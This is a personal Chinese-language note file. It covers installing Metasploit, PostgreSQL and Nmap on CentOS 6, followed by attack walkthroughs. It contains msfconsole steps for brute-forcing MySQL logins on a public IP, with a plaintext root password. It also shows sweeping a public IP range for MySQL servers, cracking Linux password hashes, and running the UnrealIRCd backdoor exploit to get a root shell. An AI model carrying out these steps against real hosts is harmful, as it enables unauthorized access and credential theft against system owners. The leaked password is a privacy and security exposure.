
❤️ CentOS 6 安装

🔵 安装依赖:

    yum groupinstall 'Development Tools'

    yum install sqlite-devel libxslt-devel libxml2-devel java-1.7.0-openjdk libpcap-devel nano openssl-devel zlib-devel libffi-devel gdbm-devel readline-devel nano wget


🔵 安装yaml:(ruby依赖)

        cd /usr/src
        wget http://pyyaml.org/download/libyaml/yaml-0.1.6.tar.gz
        tar zxvf yaml-0.1.6.tar.gz 
        cd yaml-0.1.6
        ./configure --prefix=/usr/local
        make && make install


🔵 ruby 安装

        cd /usr/src
        wget http://ftp.ruby-lang.org/pub/ruby/2.2/ruby-2.2.1.tar.gz
        tar zxvf ruby-2.2.1.tar.gz
        cd ruby-2.2.1
        ./configure --prefix=/usr/local --with-opt-dir=/usr/local/lib
        make && make install


🔵 安装 Nmap

    cd /usr/src  svn co https://svn.nmap.org/nmap
    cd nmap && ./configure
    make && make install && make clean



🔵 安装 Postgresql

        下载
        exclude=postgresql*
        wget https://download.postgresql.org/pub/repos/yum/9.4/redhat/rhel-6-i386/pgdg-centos94-9.4-3.noarch.rpm

        rpm -ivh pgdg-centos94-9.4-3.noarch.rpm

        yum update
        yum install postgresql94-server postgresql94-devel postgresql94


        现在开始初始化服务器并将其配置为自动启动，命令如下
        service postgresql-9.4 initdb
        service postgresql-9.4 start
        chkconfig postgresql-9.4 on


        因为编译ruby所必须的gem时，需要把新安装的加入路径，这样编译器就能找到库和二进制文件，接下来需要执行几个命令：

        echo export PATH=/usr/pgsql-9.4/bin:\$PATH >> /etc/bashrc
            // 如果你用的是zsh 就修改 .zhsrc
            // 添加这行内容进去就可以  export PATH=/usr/pgsql-9.4/bin:$PATH
        source ~/.bashrc
            // 这个是重新加载 bash的意思. 
            // source ~/.zshrc


        接下来，切换到Postgresql用户，
        这样就可以创建我们将要用于Metasploit的用户名和数据库了，命令如下：

        su - postgres


        现在开始创建用户和数据库,这些都将在database.yml中使用到。命令如下：
        createuser msf -P -S -R -D     // 记住自己的的密码. 我是 xujian
        createdb -O msf msf
        exit



        为了允许我们创建的用户能够连接Postgresql，我们需要设置一下pg_hba.conf文件，命令如下：
            vi /var/lib/pgsql/9.4/data/pg_hba.conf

            local msf msf md5
            hostmsf msf 127.0.0.1/8 md5
            hostmsf msf ::1/128 md5


            设置好了之后，重启服务：
            service postgresql-9.4 restart
            这里你设置不对 就会启动不了!!!
            我我们就不该.
            不就是连接服务器上的数据库么.
            navicast 可以通过ssh 先登录到服务器. 再连接到数据库.
            这样就不用该这个设置了..





🔵 安装Metasploit框架.

我们需要再安装一些Metasploit依赖的Ruby库，命令如下：

gem install wirble pg sqlite3 msgpack activerecord redcarpet rspec simplecov yard bundler


🔸 使用Git下载最新的Metasploit，命令如下：
    cd /opt
    git clone https://github.com/rapid7/metasploit-framework.git
    cd metasploit-framework



🔸 为了在终端下也能运行，这样就不仅仅只在Metasploit的文件中运行。我们需要创建软链接。

    bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
    ln -s /opt/metasploit-framework/armitage /usr/local/bin/armitage


🔸 在终端下，进入Metasploit的文件中，使用Bundler Gem来安装合适的Gem版本：
    bundle install


🔸 创建Metasploit框架将要使用的database.yml，命令如下：

    vi /opt/metasploit-framework/database.yml
        database.yml中的具体内容如下：
            production:
            adapter: postgresql
            database: msf
            username: msf
            password: 
            host: 127.0.0.1
            port: 5432
            pool: 75
            timeout: 5



        再次执行以下命令，这样就能通过Armitage和msfconsole在当前shell中创建和加载环境变量：

        echo export MSF_DATABASE_CONFIG=/opt/metasploit-framework/database.yml >> /etc/bashrc
        source ~/.bashrc


        msfconsole  运行msf
        然后服务器重启 输入 msfconsole 看看能不能进去..










弱口令攻击是最基本的攻击方式，metasploit当然也有弱口令攻击的模块 
下面利用metasploit来爆破一下本地的3306，也就是mysql密码



❤️ MySQL 登录

有问题!! 本地mysql8 就可以登录进去. vps的5.5. 就登录不了... 坑..

启动MSFCONSOLE。执行命令如下所示：
🔅 msfconsole

扫描所有mysql模块
🔅 search mysql

选择一个模块:
🔅 use auxiliary/scanner/mysql/mysql_login

显示该模块有效选项:
🔅 show options

  选项名、当前设置、需求、描述
  其中Required为yes的选项是必须配置的，反之可以不用配置。
  当然 Required为yes 前面有默认值的可以不配置. 没有默认值的必须配置.
  如:RHOSTS 就是目标IP. 这个必须配置的...



指定目标、指定用户文件、指定密码文件.
📌 set RHOSTS 23.105.192.96
📌 set PASSWORD xujian0219
📌 set USERNAME root
 
set user_file /Users/v/Desktop/usernames.txt
set pass_file /Users/v/Desktop/passwords.txt


set USERNAME root                           设置账户也，可以指定一个文件 
set USER_FILE 文件名
set PASS_FILE lee/mima.txt                  设置用于爆破的密码字典
set THREADS 1                               设置线程，越大越快，我的密码本不大，1就够了





🔅 exploit  扫描的意思...
run 也可以.






❤️ 查 某段IP内的 活动mysql.
use auxiliary/scanner/mysql/mysql_version

set RHOSTS 101.92.194.1-254

run

    101.92.194.204
    101.92.192.0 - 101.92.207.255
    101.92.192.0/20






本机iP: 101.225.78.86


netstat -nr 
查看本机网段.

nmap 网段内活动主机
    nmap -sP 101.225.72/21

    怎么找出 活动主机中的... 服务器.

    Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-10 11:17 CST
    Nmap scan report for 101.225.72.3
    Host is up (0.089s latency).
    Nmap scan report for 101.225.72.6
    Host is up (0.12s latency).
    Nmap scan report for 101.225.72.11
    Host is up (0.11s latency).
    Nmap done: 24 IP addresses (3 hosts up) scanned in 17.88 seconds


也可以直接用 nessus 来扫描网段...


然后呢...
针对某电脑 进行....xxoo











利用上面Nmap的扫描结果，选取192.168.20.4上所运行的3Com 3CDaemon FTP Server为攻击目标。通过前面的扫描可以得到目标主机运行的操作系统及应用程序版本的详细信息，如图4所示，在Metasploit Framework里搜索针对3CDaemon的攻击脚本：










⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
漏洞扫描 用 nessus







漏洞利用 用 msfcli 或者 msfgui (armitage)

MSFCONSOLE用于管理用户的会话，而Meterpreter则是攻击载荷和渗透攻击交互



🔅 msfconsole
🔅 search linux
🔅 use auxiliary/analyze/jtr_linux
🔅 show options
从输出结果中可以看到jtr_linux模块有5个有效的选项，
如Crypt、JOHN_BASE、JOHE_PATH、Munge和Wordlist。在输出的信息中，对这5个选项分别有详细的描述。


🔅 set JOHN_PATH /usr/share/metasploit-framework/data/wordlists/password.lst
🔅 exploit






Mac php7 漏洞 最新版本是 php7.0.16 .




🔵 msf 入门

🔅 use exploit/unix/irc/unreal_ircd_3281_backdoor
🔅 set rhost 192.168.169.139
🔅 exploit

这里就拿到了对方的shell. 而且是root权限的!!  输入 whoami 可以看到是 root 权限的

Metasploit 拥有msfpayload 和msfencode 这两个工具，这两个工具不但可以生成exe 型后门，一可以生成网页脚本类型的webshell ，通过生成webshell 然后设置监听器，访问webshell的url，幸运的话可以产生一个session，以便进一步利用




http://23.105.192.96/phpinfo.php

操作系统渗透.





⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️






